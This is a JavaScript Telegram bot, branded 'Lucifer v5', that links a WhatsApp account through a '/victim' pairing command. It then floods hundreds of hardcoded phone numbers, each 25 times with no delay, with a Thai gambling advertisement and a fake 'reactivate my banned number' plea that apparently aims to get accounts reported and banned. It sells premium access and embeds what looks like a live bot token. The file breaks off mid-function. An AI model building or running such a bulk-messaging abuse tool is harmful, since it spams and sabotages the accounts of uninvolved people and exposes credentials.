const { Telegraf, Markup } = require('telegraf');
const moment = require('moment');
const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');

// ─── CONFIG ───
const BOT_TOKEN = "8137847177:AAG85UEYgcKutgtvY-Gq39fGG4IBrDx5XJo"; // Your Telegram bot token
const WHATSAPP_CHANNEL = "https://whatsapp.com/channel/0029VbB4AeoF1YlZVNDXUe2v"; // Your channel
const OWNER_IDS = ["8251180804", "8413568573"]; // Your Telegram IDs
// TODO: ADD YOUR NUMBERS HERE
const TARGET_NUMBERS = [
  "2694855948",
  "2694054739",
  "2694474329",
  "2694760730",
  "2694170397",
  "2694933583",
  "2694654023",
  "2694652547",
  "2694481831",
  "2694648085",
  "2694678042",
  "2694215029",
  "2694450953",
  "2694855131",
  "2694070809",
  "2694783292",
  "2694971555",
  "2694122490",
  "2694762897",
  "2694941859",
  "2694983061",
  "2694455895",
  "2694446503",
  "2694636347",
  "2694663401",
  "2694722733",
  "2694459895",
  "2694731650",
  "2694445091",
  "2694445044",
  "2694784999",
  "2694654850",
  "2694288964",
  "2694051577",
  "2694265217",
  "2694652910",
  "2694492578",
  "2694448832",
  "2694481878",
  "2694493331",
  "2694637398",
  "2694654013",
  "2694041217",
  "2694595824",
  "2694652082",
  "2694446470",
  "2694860810",
  "2694947834",
  "2694871691",
  "2694490528",
  "2694025605",
  "2694657697",
  "2694963678",
  "2694933521",
  "2694797629",
  "2694080292",
  "2694502518",
  "2694859546",
  "2694905471",
  "2694481896",
  "2694459806",
  "2694694826",
  "2694483580",
  "2694445046",
  "2694054727",
  "2694648579",
  "2694870342",
  "2694945160",
  "2694654888",
  "2694931730",
  "2694448891",
  "2694458343",
  "2694945933",
  "2694945926",
  "2694263841",
  "2694492593",
  "2694855973",
  "2694783276",
  "2694456692",
  "2694217874",
  "2694083653",
  "2694935733",
  "2694525705",
  "2694493750",
  "2694483516",
  "2694280943",
  "2694652903",
  "2694474361",
  "2694657848",
  "2694716059",
  "2694450979",
  "2694446860",
  "2694731603",
  "2694036003",
  "2694505875",
  "2694606670",
  "2694051566",
  "2694648048",
  "2694781326",
  "2694493300",
  "2694941818",
  "2694657872",
  "2694054722",
  "2694474341",
  "2694941805",
  "2694902400",
  "2694781375",
  "2694797692",
  "2694025655",
  "2694678012",
  "2694655892",
  "2694451898",
  "2694495909",
  "2694511750",
  "2694494785",
  "2694876307",
  "2694459887",
  "2694080196",
  "2694855199",
  "2694458963",
  "2694268713",
  "2694656250",
  "2694080262",
  "2694654059",
  "2694265227",
  "2694483526",
  "2694657680",
  "2694788046",
  "2694652952",
  "2694495010",
  "2694652948",
  "2694453433",
  "2694852312",
  "2694852339",
  "2694108163",
  "2694510951",
  "2694483519",
  "2694783277",
  "2694505874",
  "2694890080",
  "2694780868",
  "2694254622",
  "2694506118",
  "2694780785",
  "2694945154",
  "2694502536",
  "2694091914",
  "2694593711",
  "2694964372",
  "2694852301",
  "2694010894",
  "2694062320",
  "2694553872",
  "2694205257",
  "2694942505",
  "2694122478",
  "2694510998",
  "2694902466",
  "2694553409",
  "2694852370",
  "2694783140",
  "2694659491",
  "2694870600",
  "2694493795",
  "2694921976",
  "2694797637",
  "2694052697",
  "2694941894",
  "2694490577",
  "2694651947",
  "2694781351",
  "2694508633",
  "2694870372",
  "2694450320",
  "2694050819",
  "2694731791",
  "2694870682",
  "2694254649",
  "2694067371",
  "2694910890",
  "2694679196",
  "2694082138",
  "2694016188",
  "2694636327",
  "2694659417",
  "2694280948",
  "2694935792",
  "2694120981",
  "2694205221",
  "2694935714",
  "2694506140",
  "2694633338",
  "2694781236",
  "2694053458",
  "2694220260",
  "2694870311",
  "2694448838",
  "2694678558",
  "2694503237",
  "2694502583",
  "2694872915",
  "2694052612",
  "2694942583",
  "2694505832",
  "2694663495",
  "2694080291",
  "2694797357",
  "2694205252",
  "2694788020",
  "2694905458",
  "2694511795",
  "2694956519",
  "2694220233",
  "2694655835",
  "2694780891",
  "2694678093",
  "2694870055",
  "2694474330",
  "2694890025",
  "2694204824",
  "2694850278",
  "2694505836",
  "2694036072",
  "2694983070",
  "2694051514",
  "2694091946",
  "2694446597",
  "2694495008",
  "2694725131",
  "2694446471",
  "2694788087",
  "2694050888",
  "2694503213",
  "2694783045",
  "2694083658",
  "2694783003",
   "2694455115",
  "2694458346",
  "2694508613",
  "2694788566",
  "2694945405",
  "2694508331",
  "2694963606",
  "2694663440",
  "2694638828",
  "2694902440",
  "2694783022",
  "2694781377",
  "2694036017",
  "2694487294",
  "2694652938",
  "2694850225",
  "2694678088",
  "2694783229",
  "2694963682",
  "2694263898",
  "2694062308",
  "2694451567",
  "2694215649",
  "2694453434",
  "2694204827",
  "2694783517",
  "2694935726",
  "2694446430",
  "2694593773",
  "2694054792",
  "2694455809",
  "2694694849",
  "2694799688",
  "2694648022",
  "2694863656",
  "2694575783",
  "2694788982",
  "2694036525",
  "2694215081",
  "2694797342",
  "2694931797",
  "2694450439",
  "2694493780",
  "2694870010",
  "2694931734",
  "2694835856",
  "2694217845",
  "2694080117",
  "2694637341",
  "2694947807",
  "2694505884",
  "2694575733",
  "2694945906",
  "2694453612",
  "2694446882",
  "2694694865",
  "2694620755",
  "2694652520",
  "2694648030",
  "2694780811",
  "2694975835",
  "2694656222",
  "2694206623",
  "2694120926",
  "2694583232",
  "2694012871",
  "2694788511",
  "2694731711",
  "2694870693",
  "2694663431",
  "2694445096",
  "2694620721",
  "2694784319",
  "2694483594",
  "2694459885",
  "2694217869",
  "2694012816",
  "2694450304",
  "2694442031",
  "2694730668",
  "2694495046",
  "2694446538",
  "2694606643",
  "2694052635",
  "2694860870",
  "2694288998",
  "2694080136",
  "2694041272",
  "2694254606",
  "2694280916",
  "2694510934",
  "2694553858",
  "2694679195",
  "2694054905",
  "2694678043",
  "2694727302",
  "2694220206",
  "2694525727",
  "2694495084",
  "2694652516",
  "2694964307",
  "2694975841",
  "2694220254",
  "2694871647",
  "2694070815",
  "2694458911",
  "2694628900",
  "2694637373",
  "2694725195",
  "2694494706",
  "2694494731",
  "2694620795",
  "2694935742",
  "2694620707",
  "2694213988",
  "2694855112",
  "2694221935",
  "2694073239",
  "2694859583",
  "2694663485",
  "2694488928",
  "2694731605",
  "2694215677",
  "2694448823",
  "2694228845",
  "2694575794",
  "2694863651",
  "2694788515",
  "2694070838",
  "2694876346",
  "2694760711",
  "2694525758",
  "2694481830",
  "2694490525",
  "2694910889",
  "2694636381",
  "2694638888",
  "2694788564",
  "2694782115",
  "2694648077",
  "2694206632",
  "2694016103",
  "2694781387",
  "2694077570",
  "2694552792",
  "2694872120",
  "2694508324",
  "2694254659",
  "2694652586",
  "2694716054",
  "2694206682",
  "2694583206",
  "2694872986",
  "2694091963",
  "2694215658",
  "2694810464",
  "2694648063",
  "2694933565",
  "2694860863",
  "2694506106",
  "2694842487",
  "2694730679",
  "2694067374",
  "2694921954",
  "2694638874",
  "2694456634",
  "2694678090",
  "2694890086",
  "2694620722",
  "2694677815",
  "2694455157",
  "2694797398",
  "2694783105",
  "2694062379",
  "2694543173",
  "2694850223",
  "2694492505",
  "2694455801",
  "2694448848",
  "2694652539",
  "2694450954",
  "2694543127",
  "2694483559",
  "2694217821",
  "2694025641",
  "2694764268",
  "2694783506",
  "2694956501",
  "2694570193",
  "2694638876",
  "2694041276",
  "2694850214",
  "2694628989",
  "2694492524",
  "2694783573",
  "2694842491",
  "2694508340",
  "2694510989",
  "2694636361",
  "2694872946",
  "2694445047",
  "2694456633",
  "2694648513",
  "2694506150",
  "2694503287",
  "2694220243",
  "2694945482",
  "2694459844",
  "2694853058",
  "2694593746",
  "2694054900",
  "2694876390",
  "2694784993",
  "2694762863",
  "2694493339",
  "2694446823",
  "2694714715",
  "2694780758",
  "2694583268",
  "2694050821",
  "2694633356",
  "2694050858",
  "2694942584",
  "2694633372",
  "2694082113",
  "2694451812",
  "2694872160",
  "2694988521",
  "2694552782",
  "2694510965",
  "2694073577",
  "2694453443",
  "2694662245",
  "2694054794",
  "2694221971",
  "2694205499",
  "2694446827",
  "2694797622",
   "2694073576",
  "2694543148",
  "2694108133",
  "2694872957",
  "2694050825",
  "2694450454",
  "2694256137",
  "2694494790",
  "2694575724",
  "2694052667",
  "2694694857",
  "2694945133",
  "2694506199",
  "2694983023",
  "2694120908",
  "2694844551",
  "2694082119",
  "2694731702",
  "2694263873",
  "2694070826",
  "2694200733",
  "2694054918",
  "2694073275",
  "2694657819",
  "2694453431",
  "2694855921",
  "2694553897",
  "2694797324",
  "2694798007",
  "2694725164",
  "2694637319",
  "2694840492",
  "2694620778",
  "2694945407",
  "2694228877",
  "2694220255",
  "2694446867",
  "2694655847",
  "2694725171",
  "2694493340",
  "2694450432",
  "2694450993",
  "2694890026",
  "2694254636",
  "2694575774",
  "2694288916",
  "2694716993",
  "2694787297",
  "2694501169",
  "2694453416",
  "2694474322",
  "2694628991",
  "2694652069",
  "2694451858",
  "2694716972",
  "2694254628",
  "2694494737",
  "2694553875",
  "2694663421",
  "2694051553",
  "2694810444",
  "2694655844",
  "2694945437",
  "2694971503",
  "2694446824",
  "2694853098",
  "2694902447",
  "2694062388",
  "2694905477",
  "2694662253",
  "2694453685",
  "2694852319",
  "2694012838",
  "2694239790",
  "2694731716",
  "2694459859",
  "2694511713",
  "2694511761",
  "2694663405",
  "2694441538",
  "2694679103",
  "2694963615",
  "2694780725",
  "2694941820",
  "2694073205",
  "2694730667",
  "2694853065",
  "2694780796",
  "2694054970",
  "2694450485",
  "2694553419",
  "2694786583",
  "2694474308",
  "2694575766",
  "2694783131",
  "2694490509",
  "2694268725",
  "2694836922",
  "2694852371",
  "2694788907",
  "2694217814",
  "2694455826",
  "2694508374",
  "2694941871",
  "2694204856",
  "2694450488",
  "2694052633",
  "2694217808",
  "2694652911",
  "2694657836",
  "2694798094",
  "2694458378",
  "2694553471",
  "2694662811",
  "2694870637",
  "2694206691",
  "2694213957",
  "2694482907",
  "2694451886",
  "2694620729",
  "2694662254",
  "2694266863",
  "2694911270",
  "2694450949",
  "2694852320",
  "2694762821",
  "2694787217",
  "2694575714",
  "2694730650",
  "2694446514",
  "2694080246",
  "2694921978",
  "2694678016",
  "2694797658",
  "2694012862",
  "2694016195",
  "2694638884",
  "2694780111",
  "2694077707",
  "2694082183",
  "2694788922",
  "2694963636",
  "2694025673",
  "2694254627",
  "2694797388",
  "2694941899",
  "2694012832",
  "2694213908",
  "2694931777",
  "2694871651",
  "2694678550",
  "2694080151",
  "2694445083",
  "2694852385",
  "2694492514",
  "2694053442",
  "2694455869",
  "2694481849",
  "2694877973",
  "2694505801",
  "2694935706",
  "2694511798",
  "2694228888",
  "2694570160",
  "2694844590",
  "2694570101",
  "2694725122",
  "2694924664",
  "2694783529",
  "2694454518",
  "2694474396",
  "2694051543",
  "2694446415",
  "2694067389",
  "2694041298",
  "2694292492",
  "2694656255",
  "2694860802",
  "2694450352",
  "2694945984",
  "2694714733",
  "2694454515",
  "2694503285",
  "2694810408",
  "2694474384",
  "2694070891",
  "2694108106",
  "2694204893",
  "2694931727",
  "2694446802",
  "2694620769",
  "2694266869",
  "2694453646",
  "2694073240",
  "2694798052",
  "2694716050",
  "2694782180",
  "2694206137",
  "2694495957",
  "2694454523",
  "2694448863",
  "2694780727",
  "2694941837",
  "2694077756",
  "2694254680",
  "2694722720",
  "2694988500",
  "2694170375",
  "2694455892",
  "2694781221",
  "2694505868",
  "2694553451",
  "2694451829",
  "2694552761",
  "2694077780",
  "2694593706",
  "2694036546",
  "2694956582",
  "2694636313",
  "2694731666",
  "2694935781",
  "2694054795",
  "2694455875",
  "2694863663",
  "2694964302",
  "2694648558",
  "2694655839",
  "2694204868",
  "2694788945",
  "2694073276",
  "2694280920",
  "2694062317",
  "2694872958",
  "2694018427",
  "2694628949",
  "2694052666",
  "2694842468",
  "2694077753",
   "2694067337",
  "2694053157",
  "2694288974",
  "2694890022",
  "2694018410",
  "2694983074",
  "2694945488",
  "2694487297",
  "2694764257",
  "2694678506",
  "2694870686",
  "2694872973",
  "2694783286",
  "2694494778",
  "2694018473",
  "2694453441",
  "2694204858",
  "2694494743",
  "2694053189",
  "2694455840",
  "2694780181",
  "2694450351",
  "2694678586",
  "2694054735",
  "2694122442",
  "2694727361",
  "2694217882",
  "2694714728",
  "2694073506",
  "2694783516",
  "2694018486",
  "2694077507",
  "2694945487",
  "2694657858",
  "2694784959",
  "2694662047",
  "2694788530",
  "2694010812",
  "2694213996",
  "2694446804",
  "2694780825",
  "2694844565",
  "2694727366",
  "2694054989",
  "2694508618",
  "2694964311",
  "2694855917",
  "2694053495",
  "2694783129",
  "2694266890",
  "2694760769",
  "2694054953",
  "2694788505",
  "2694784956",
  "2694052648",
  "2694292418",
  "2694678504",
  "2694493736",
  "2694215615",
  "2694474321",
  "2694220205",
  "2694716074",
  "2694553843",
  "2694450397",
  "2694788541",
  "2694890092",
  "2694606655"
]; // Paste your target numbers (779 or 596) here manually
const CUSTOM_MESSAGE1 = `สวัสดีครับเพื่อนๆ นักเสี่ยงโชค! 🎉

วันนี้เรามีข่าวดีมาบอกกัน! ✨ กำลังมีเกมส์สล็อตสุดฮิตที่กำลังมาแรงที่สุดในตอนนี้! 🔥 และวันนี้เราจะพาคุณไปสัมผัสกับความมันส์แบบสุดๆ ที่นี่ MaxWin888.com 💥

ก่อนอื่นเลย ต้องบอกว่าเกมส์สล็อตเป็นเกมส์ที่เล่นง่ายและสนุกมากๆ ไม่ว่าคุณจะเป็นมือใหม่หรือมือเก๋า คุณก็สามารถเข้ามาลองเล่นได้ เพียงแค่คลิกเข้ามาที่เว็บไซต์ของเรา คุณจะพบกับเกมส์สล็อตหลากหลายรูปแบบ หลากหลายธีม และหลากหลายฟีเจอร์สุดพิเศษ ที่จะทำให้คุณตื่นเต้นและเพลิดเพลินไปกับการหมุนวงล้อ ตลอด 24 ชั่วโมง! 🎰

เกมส์สล็อตของเราไม่ได้มีแค่ความสนุกเท่านั้นนะ แต่ยังมีโอกาสที่จะทำให้คุณรวยได้อีกด้วย! 💰 ใช่แล้ว! คุณสามารถชนะเงินรางวัลใหญ่ๆ ได้ทุกเมื่อ เพียงแค่หมุนวงล้อ และเตรียมตัวรับความตื่นเต้นไปกับการค้นพบโบนัสและแจ็คพอตสุดพิเศษ! 🎁

ที่ MaxWin888.com เรามีเกมส์สล็อตมากมายให้คุณเลือกเล่น ไม่ว่าจะเป็นเกมส์สล็อตธีมผลไม้ ธีมสัตว์ ธีมการ์ตูน หรือธีมอื่นๆ อีกมากมาย เราพร้อมเสนอประสบการณ์การเล่นเกมส์สล็อตที่ไม่มีที่ไหนเทียบได้! 🥭🦁🐱‍🚀

คุณจะได้สัมผัสกับกราฟิกที่สวยงาม เสียงประกอบที่ตื่นเต้น และการเล่นเกมส์ที่ราบรื่น ไม่มีสะดุด! ภาพเคลื่อนไหวที่ลื่นไหว และเสียงประกอบที่ท้าทาย จะทำให้คุณติดใจในการเล่นเกมส์สล็อตของเราอย่างแน่นอน! ✨

นอกจากนี้ เรายังมีโปรโมชั่นและกิจกรรมมากมายให้คุณร่วมสนุก เช่น โบนัสต้อนรับ โบนัสรายวัน และการแข่งขันต่างๆ ที่จะทำให้คุณได้รับเงินรางวัลมากมาย! 🎉 รับโบนัสพิเศษทันทีเมื่อคุณสมัครสมาชิกกับเรา!

ไม่ต้องรอช้า เข้ามาสัมผัสประสบการณ์การเล่นเกมส์สล็อตที่น่าตื่นเต้นที่สุด คลิกเลยที่นี่ 👉 https://maxwin888.com 🚀

และหากคุณมีคำถามหรือต้องการความช่วยเหลือ อย่าลังเลที่จะติดต่อเราผ่านทาง WhatsApp ที่นี่เลย! 💬 https://api.whatsapp.com/send?phone=628xxxx&type=phone_number&app_absent=1&lang=th&source=secret&force_send=1

อย่าพลาดโอกาสที่จะรวยไปกับเกมส์สล็อตสุดมันส์ที่ MaxWin888.com! 🍀 เริ่มต้นการผจญภัยของคุณวันนี้! 🚀`; // First promotional message
// TODO: ADD YOUR SECOND MESSAGE HERE
const CUSTOM_MESSAGE2 = "please Deactivate The My Account Number (https://wa.me/+2347068413798) My Whatsapp Number Has been banned Turn it on Again My personal Number My Friends And family member me waiting My business Account i am very upset please Sir As Soon As My Number open I am Very Thankful if i have any mistake, i would like to apologize. My Whatsapp Number is + immediately Because The Number Has Been lost +2347068413798"; // Second promotional message
const SEND_TIMES = 25; // Number of sends per number (1-2 recommended to avoid spam)
const DELAY_MS = 0000; // Delay between sends (5 seconds)

// Store active WhatsApp sockets and their Telegram user IDs
const whatsappSockets = new Map();
// Track verified (channel followers), premium, and admin users
const verifiedUsers = new Set(); // Users who followed the WhatsApp channel
const premiumUsers = new Set(); // Users added via /addprem
const adminUsers = new Set(); // Admins added via /addadmin
// Track all bot users for broadcasting
const botUsers = new Set();
// Track paired users (Telegram ID -> phone number)
let pairedUsers = {};
// Free access period (in milliseconds)
let freeAccessUntil = 0;

// Load data from data.json (premium users and admins)
const dataFile = './data.json';
if (fs.existsSync(dataFile)) {
  try {
    const data = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
    data.premiumUsers?.forEach(id => premiumUsers.add(String(id))); // Ensure string IDs
    data.adminUsers?.forEach(id => adminUsers.add(String(id))); // Ensure string IDs
    console.log(`[startup] Loaded premiumUsers: ${[...premiumUsers].join(', ')}`);
    console.log(`[startup] Loaded adminUsers: ${[...adminUsers].join(', ')}`);
  } catch (error) {
    console.error('Error loading data.json:', error);
  }
}

// Save data to data.json
function saveData() {
  try {
    fs.writeFileSync(dataFile, JSON.stringify({
      premiumUsers: [...premiumUsers],
      adminUsers: [...adminUsers]
    }, null, 2));
    console.log('[saveData] Saved premiumUsers:', [...premiumUsers]);
  } catch (error) {
    console.error('Error saving data.json:', error);
  }
}

// Load paired users from file (if exists)
const pairedUsersFile = './pairedUsers.json';
if (fs.existsSync(pairedUsersFile)) {
  try {
    pairedUsers = JSON.parse(fs.readFileSync(pairedUsersFile, 'utf8'));
  } catch (error) {
    console.error('Error loading pairedUsers.json:', error);
  }
}

// Save paired users to file
function savePairedUsers() {
  try {
    fs.writeFileSync(pairedUsersFile, JSON.stringify(pairedUsers, null, 2));
  } catch (error) {
    console.error('Error saving pairedUsers.json:', error);
  }
}

const bot = new Telegraf(BOT_TOKEN);

// ─── Error Handling ───
bot.catch((err, ctx) => {
  console.error(`Error for ${ctx.updateType}:`, err);
  ctx.reply(`❌ Bot error: ${err.message}`);
});

// ─── Force Follow Middleware ───
async function requireFollow(ctx, next) {
  const userId = String(ctx.from.id);
  botUsers.add(userId); // Track all users who interact
  if (!verifiedUsers.has(userId) && !premiumUsers.has(userId) && !OWNER_IDS.includes(userId) && !adminUsers.has(userId)) {
    return ctx.reply(
      "❌ You must follow the ༒ Cyber Dev Club ༒ WhatsApp channel before using Lucifer v5:\n\n" +
      WHATSAPP_CHANNEL,
      Markup.inlineKeyboard([
        [Markup.button.url("📢 Follow Channel", WHATSAPP_CHANNEL)],
        [Markup.button.callback("✅ I Followed", "followed")]
      ])
    );
  }
  return next();
}

// ─── Check Free Access and Premium Status ───
async function restrictAccess(ctx, next) {
  const userId = String(ctx.from.id);
  const now = Date.now();
  const isOwnerOrAdmin = OWNER_IDS.includes(userId) || adminUsers.has(userId);
  const isPremium = premiumUsers.has(userId);
  const isFreeAccess = now < freeAccessUntil;

  console.log(`[restrictAccess] User: ${userId}, Owner/Admin: ${isOwnerOrAdmin}, Premium: ${isPremium}, Free Access Until: ${moment(freeAccessUntil).format("HH:mm:ss")} (Now: ${moment(now).format("HH:mm:ss")}), Is Free Access: ${isFreeAccess}`);

  // Allow /start, /menu, /join for all users
  if (['start', 'menu', 'join'].includes(ctx.message?.text?.split(' ')[0]?.slice(1))) {
    return next();
  }

  // Owners and admins have full access
  if (isOwnerOrAdmin) {
    console.log(`[restrictAccess] Allowing owner/admin ${userId}`);
    return next();
  }

  // Premium users have access to /victim
  if (isPremium && ctx.message?.text?.startsWith('/victim')) {
    console.log(`[restrictAccess] Allowing premium user ${userId} for /victim`);
    return next();
  }

  // Non-premium verified users during free access have access to /victim
  if (isFreeAccess && verifiedUsers.has(userId) && ctx.message?.text?.startsWith('/victim')) {
    console.log(`[restrictAccess] Allowing verified user ${userId} for /victim during free access`);
    return next();
  }

  // Block non-premium users outside free access
  console.log(`[restrictAccess] Blocking user ${userId}: no premium or free access`);
  return ctx.reply("❌ Contact @KingKw3si to buy premium access or wait for free access period.");
}

// ─── Handle "I Followed" Button ───
bot.action("followed", (ctx) => {
  const userId = String(ctx.from.id);
  botUsers.add(userId); // Track user
  verifiedUsers.add(userId); // Add to verifiedUsers for channel followers
  console.log(`[followed] User ${userId} added to verifiedUsers`);
  ctx.reply("✅ Thank you for following! Type /menu to see options. Contact @KingKw3si for premium access.");
});

// ─── Start Command ───
bot.command("start", async (ctx) => {
  botUsers.add(String(ctx.from.id)); // Track user
  ctx.reply(
    "Hello😉 ⁨𓐩‎𝕷𝖚𝖈𝖎𝖋𝖊𝖗ʳᵉᵇᵒʳⁿ❦🕸!\n𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 LUCIFER MD 👋\nType /menu to see available commands."
  );
});

// ─── Join Command ───
bot.command("join", async (ctx) => {
  botUsers.add(String(ctx.from.id)); // Track user
  ctx.reply(
    "Join the official ༒ Cyber Dev Club ༒ WhatsApp channel:\n\n" + WHATSAPP_CHANNEL,
    Markup.inlineKeyboard([
      [Markup.button.url("📢 Follow Channel", WHATSAPP_CHANNEL)]
    ])
  );
});

// ─── Menu Command ───
bot.command("menu", requireFollow, async (ctx) => {
  const userId = String(ctx.from.id);
  const status = premiumUsers.has(userId) ? "Premium" : "Free";
  const now = moment().format("HH:mm:ss");
  const menu = `
Hello😉 ⁨𓐩‎𝕷𝖚𝖈𝖎𝖋𝖊𝖗ʳᵉᵇᵒʳⁿ❦🕸!
𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 LUCIFER MD 👋

𖤊───⪩ Lucifer-Md⪨───𖤊
╭──────────────────────╮
│✧ Name       : Lucifer v5
│✧ Version    : 2.0.0
│✧ Master Dev : @Backagain56
│✧ Online     : ${now}
│✧ User ID    : ${userId}
│✧ Status     : ${status}
╰──────────────────────╯
dev - @KingKw3si
╔══「 PUBLIC COMMANDS 」══▢
║ /start
║ /menu
║ /join
╚══════▢
╔══「 PREMIUM COMMANDS 」══▢
║ /victim <number>
╚══════▢
╔══「 OWNER/ADMIN COMMANDS 」══▢
║ /addprem <telegramId>
║ /delprem <telegramId>
║ /listprem
║ /broadcast <message>
║ /freelimit <minutes>
║ /addadmin <telegramId>
║ /deladmin <telegramId>
║ /ping
╚══════▢➩ ➩ /join the official channel
  `;
  ctx.reply(menu);
});

// ─── WhatsApp Pairing Handler ───
async function startPairing(phoneNumber, ctx) {
  const sessionDir = `./session/${phoneNumber}@s.whatsapp.net`;
  const telegramId = String(ctx.from.id);

  if (whatsappSockets.has(phoneNumber)) {
    return ctx.reply(`❌ Number ${phoneNumber} is already paired.`);
  }

  // Check pairing limit for non-owner/non-premium/non-admin users
  if (!OWNER_IDS.includes(telegramId) && !premiumUsers.has(telegramId) && !adminUsers.has(telegramId)) {
    if (pairedUsers[telegramId]) {
      console.log(`[startPairing] Blocking user ${telegramId}: already paired ${pairedUsers[telegramId]}`);
      return ctx.reply("❌ Please DM @KingKw3si  or @Backagain56to buy premium access for additional pairings.");
    }
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const sock = makeWASocket({
    logger: pino({ level: 'debug' }), // Enable debug logging
    auth: state
  });

  whatsappSockets.set(phoneNumber, { sock, telegramId });

  sock.ev.on('creds.update', saveCreds);
  sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    if (connection === 'open') {
      console.log(`Connected: ${phoneNumber}@s.whatsapp.net by Telegram ID ${telegramId}`);
      // Record the pairing for non-owner/non-premium/non-admin users
      if (!OWNER_IDS.includes(telegramId) && !premiumUsers.has(telegramId) && !adminUsers.has(telegramId)) {
        pairedUsers[telegramId] = phoneNumber;
        savePairedUsers();
        console.log(`[startPairing] Recorded pairing for ${telegramId}: ${phoneNumber}`);
      }
      ctx.reply(`✅ Lucifer v5 connected for ${phoneNumber}. Sending messages to ${TARGET_NUMBERS.length} numbers...`);

      try {
        for (const targetNumber of TARGET_NUMBERS) {
          for (let i = 0; i < SEND_TIMES; i++) {
            // Send first message
            await sock.sendMessage(`${targetNumber}@c.us`, { text: CUSTOM_MESSAGE1 });
            console.log(`Message 1 (${i + 1}/${SEND_TIMES}) sent to ${targetNumber}!`);
            ctx.reply(`Message 1 (${i + 1}/${SEND_TIMES}) sent to ${targetNumber}!`);
            if (i < SEND_TIMES - 1 || CUSTOM_MESSAGE2) {
              await new Promise(resolve => setTimeout(resolve, DELAY_MS));
            }

            // Send second message if defined
            if (CUSTOM_MESSAGE2) {
              await sock.sendMessage(`${targetNumber}@c.us`, { text: CUSTOM_MESSAGE2 });
              console.log(`Message 2 (${i + 1}/${SEND_TIMES}) sent to ${targetNumber}!`);
              ctx.reply(`Message 2 (${i + 1}/${SEND_TIMES}) sent to ${targetNumber}!`);
              if (i < SEND_TIMES - 1) {
                await new Promise(resolve => setTimeout(resolve, DELAY_MS));
              }
            }
          }
        }
        ctx.reply(`✅ All ${SEND_TIMES} messages sent to ${TARGET_NUMBERS.length} numbers!`);
      } catch (error) {
        console.error(`Error sending messages:`, error);
        ctx.reply(`❌ Failed to send messages: ${error.message}`);
      }
    }
    if (connection === 'close') {
      console.log(`Disconnected: ${phoneNumber}@s.whatsapp.net`, lastDisconnect?.error);
      whatsappSockets.delete(phoneNumber);
      if (lastDisconnect?.error?.output?.statusCode !== 401) {
        ctx.reply(`🔄 Reconnecting for ${phoneNumber}...`);
        setTimeout(() => startPairing(phoneNumber, ctx), 10000);
      } else {
        ctx.reply(`❌ Logged out for ${phoneNumber} due to 401 Unauthorized. Contact @KingKw3si for assistance.`);
      }
    }
  });

  if (!sock.authState.creds.registered) {
    try {
      await new Promise(resolve => setTimeout(resolve, 5000));
      const code = await sock.requestPairingCode(phoneNumber);
      ctx.reply(`✅ Pairing code for ${phoneNumber}: ${code}\nEnter this in WhatsApp: Settings > Linked Devices > Link with phone number.`);
    } catch (error) {
      console.error(`Pairing error for ${phoneNumber}:`, error);
      whatsappSockets.delete(phoneNumber);
      ctx.reply(`❌ Pairing failed for ${phoneNumber}: ${error.message}\nRetry with /victim after waiting 5-10 minutes.`);
    }
  }

  return sock;
}

// ─── Telegram Commands ───
bot.command("id", (ctx) => {
  botUsers.add(String(ctx.from.id)); // Track user
  ctx.reply(`🆔 Your Telegram ID: ${ctx.from.id}`);
});

bot.command("victim", requireFollow, restrictAccess, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (!args[0]) return ctx.reply("❌ Please provide a phone number (e.g., /victim <number>)");
  const phoneNumber = args[0].replace(/[^0-9]/g, "");
  try {
    await startPairing(phoneNumber, ctx);
  } catch (error) {
    ctx.reply(`❌ Error: ${error.message}. Wait 5-10 minutes and try again.`);
  }
});

bot.command("addprem", requireFollow, restrictAccess, async (ctx) => {
  const userId = String(ctx.from.id);
  if (!OWNER_IDS.includes(userId) && !adminUsers.has(userId)) {
    return ctx.reply("🔒 This command is restricted to owners and admins only!");
  }
  const args = ctx.message.text.split(" ").slice(1);
  if (!args[0]) return ctx.reply("❌ Please provide a Telegram user ID (e.g., /addprem 123456789)");
  const targetId = String(args[0]);
  premiumUsers.add(targetId);
  saveData();
  // Remove pairing limit for new premium user
  if (pairedUsers[targetId]) {
    delete pairedUsers[targetId];
    savePairedUsers();
    console.log(`[addprem] Cleared pairing limit for ${targetId}`);
  }
  console.log(`[addprem] Added ${targetId} to premiumUsers`);
  ctx.reply(`✅ Added ${targetId} to premium users.`);
});

bot.command("delprem", requireFollow, restrictAccess, async (ctx) => {
  const userId = String(ctx.from.id);
  if (!OWNER_IDS.includes(userId) && !adminUsers.has(userId)) {
    return ctx.reply("🔒 This command is restricted to owners and admins only!");
  }
  const args = ctx.message.text.split(" ").slice(1);
  if (!args[0]) return ctx.reply("❌ Please provide a Telegram user ID (e.g., /delprem 123456789)");
  const targetId = String(args[0]);
  if (premiumUsers.delete(targetId)) {
    saveData();
    console.log(`[delprem] Removed ${targetId} from premiumUsers`);
    ctx.reply(`✅ Removed ${targetId} from premium users.`);
  } else {
    ctx.reply(`❌ ${targetId} is not a premium user.`);
  }
});

bot.command("listprem", requireFollow, restrictAccess, async (ctx) => {
  const userId = String(ctx.from.id);
  if (!OWNER_IDS.includes(userId) && !adminUsers.has(userId)) {
    return ctx.reply("🔒 This command is restricted to owners and admins only!");
  }
  if (premiumUsers.size === 0) {
    ctx.reply("❌ No premium users found.");
  } else {
    ctx.reply(`📋 Premium users:\n${[...premiumUsers].join("\n")}`);
  }
});

bot.command("addadmin", requireFollow, restrictAccess, async (ctx) => {
  const userId = String(ctx.from.id);
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("🔒 This command is restricted to owners only!");
  }
  const args = ctx.message.text.split(" ").slice(1);
  if (!args[0]) return ctx.reply("❌ Please provide a Telegram user ID (e.g., /addadmin 123456789)");
  const targetId = String(args[0]);
  adminUsers.add(targetId);
  saveData();
  console.log(`[addadmin] Added ${targetId} to adminUsers`);
  ctx.reply(`✅ Added ${targetId} as an admin with full access.`);
});

bot.command("deladmin", requireFollow, restrictAccess, async (ctx) => {
  const userId = String(ctx.from.id);
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("🔒 This command is restricted to owners only!");
  }
  const args = ctx.message.text.split(" ").slice(1);
